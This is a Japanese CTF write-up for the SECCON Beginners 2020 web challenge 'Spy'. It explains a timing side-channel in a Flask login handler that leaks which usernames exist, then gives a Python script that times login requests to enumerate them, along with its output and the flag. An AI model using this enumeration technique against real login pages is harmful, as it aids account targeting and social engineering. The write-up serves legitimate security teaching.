# Spy
```
point:55 Beginner

As a spy, you are spying on the "ctf4b company".
You got the name-list of employees and the URL to the in-house web tool used by some of them.
Your task is to enumerate the employees who use this tool in order to make it available for social engineering.
　・app.py
　・employees.txt
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/82751186-8b1f0800-9df0-11ea-9168-07db368f168a.png)

問題にはURLとソースコードとユーザ名簿リストが一緒に添付されています。

問題文より、loginページのDBに存在する従業員全員をchallengeページでチェックして提出すればflagがもらえるらしい。

問題のURLに移動するとログイン画面に移動します。

そこに`Go to challenge page`があるのでそちらも見てみます。

![2](https://user-images.githubusercontent.com/47602064/82751280-20220100-9df1-11ea-81a6-6c2fc4a9739a.png)

問題文からも読み取れるようにこのページで正しい選択をするとflagを表示してくれるようです。

<br>

プログラムの方を見てみると以下の部分に注目してみます。

```python
@app.route("/challenge", methods=["GET", "POST"])
def challenge():
    t = time.perf_counter()

    if request.method == "GET":
        return render_template("challenge.html", employees=employees, sec="{:.7f}".format(time.perf_counter()-t))

    if request.method == "POST":
        answer = request.form.getlist("answer")

        # If you can enumerate all accounts, I'll give you FLAG!
        if set(answer) == set(account.name for account in db.get_all_accounts()):
            message = app.FLAG
        else:
            message = "Wrong!!"

        return render_template("challenge.html", message=message, employees=employees, sec="{:.7f}".format(time.perf_counter()-t))
```

ここより、`POST`で正しい`answer`の組み合わせの場合は`app.FLAG`を表示させます。

<br>

loginページの方もソースコードを見てみると以下のような内容があります。

```python
@app.route("/", methods=["GET", "POST"])
def index():
    t = time.perf_counter()

    if request.method == "GET":
        return render_template("index.html", message="Please login.", sec="{:.7f}".format(time.perf_counter()-t))

    if request.method == "POST":
        name = request.form["name"]
        password = request.form["password"]

        exists, account = db.get_account(name)

        if not exists:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        # auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.
        # You know, it's really secure... isn't it? :-)
        hashed_password = auth.calc_password_hash(app.SALT, password)
        if hashed_password != account.password:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        session["name"] = name
        return render_template("dashboard.html", sec="{:.7f}".format(time.perf_counter()-t))
```

それでこの問題の注目すべき点が各レスポンスの最後に処理時間が渡されていることです。

`sec="{:.7f}".format(time.perf_counter()-t)`

実際にブラウザで見てみると下の方に薄く表示されています。

![3](https://user-images.githubusercontent.com/47602064/82751766-7d6b8180-9df4-11ea-9f4a-32f74be350f8.png)

もう一度ソースコードを見てみます。

注目したところは以下の部分になります。

```python
if request.method == "POST":
        name = request.form["name"]
        password = request.form["password"]

        exists, account = db.get_account(name)

        if not exists:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        # auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.
        # You know, it's really secure... isn't it? :-)
        hashed_password = auth.calc_password_hash(app.SALT, password)
        if hashed_password != account.password:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))
```

パスワードをハッシュ化している部分のコメントアウトを見てみると以下のことが書いてあります。

```python
# auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.
# You know, it's really secure... isn't it? :-)
```

要するにハッシュ化の計算には時間がかかることが読みとれます。

これより入力したユーザ名がDBに存在すれば、パスワードをハッシュ化して判定をしています。

要するに、ユーザ名が存在すれば、その分「ハッシュ化とその判定」の処理があるため、

ユーザ名がDBに存在しない場合より、時間が少しかかります。

　-> `ユーザの存在有無でレスポンス時間に差異が生まれる`

<br>

なのでまずはloginページでDBに存在するユーザ名を探します。

手動の場合は一つ一つ試してみます。

<br>

自作したPythonのプログラムで判定をすると以下のようになりました。

```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-

#ctf4b2020-web-Spy

import requests
import time

url = 'https://spy.quals.beginners.seccon.jp/'

with open('employees.txt', 'r') as f:
 datas = f.readlines()

def attack(username):
 payload = {'name': username, 'password': 'admin'}
 start = time.time()
 r = requests.post(url, data=payload)
 times = time.time() - start
 return times

#main
for i in datas:
 t = attack(i.strip())
 if (t > 0.2):
  print(i.strip(), t)
```

```
$ python3 solve.py 
Elbert 0.5595736503601074
George 0.5613911151885986
Lazarus 0.7148609161376953
Marc 0.9183754920959473
Tony 0.7479007244110107
Ximena 0.7864437103271484
Yvonne 0.7165195941925049
```

<br>

明らかに時間がかかっているのを探すと以下の7名のユーザが当てはまることがわかりました。

`Elbert, George, Lazarus, Marc, Tony, Ximena, Yvonne`

なのでこれを`chalenge page`で選択して`answer`してみるとflagが表示しました。

　`Burp`の`Intruder`を使って`Response received`でも測ることが出来ました。

![4](https://user-images.githubusercontent.com/47602064/82752028-56ae4a80-9df6-11ea-9659-7926bc05e505.png)

<br><br>

## FLAG: ctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck}
